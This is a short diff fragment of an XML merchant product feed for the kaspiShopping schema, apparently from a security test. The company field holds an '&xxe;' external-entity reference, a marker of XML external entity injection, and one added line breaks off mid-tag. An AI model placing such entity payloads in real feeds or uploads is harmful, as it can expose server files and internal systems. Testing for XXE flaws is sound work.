@@ -7,7 +7,7 @@ xmlns="kaspiShopping"
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xsi:schemaLocation="kaspiShopping http://kaspi.kz/kaspishopping.xsd">
 <company>&xxe;</company>
-<merchantid>CompanyID</merchantid>
+<mercha
 <offers>
 <offer sku="232130213">
 <model>iphone 1337s white 32gb</model>
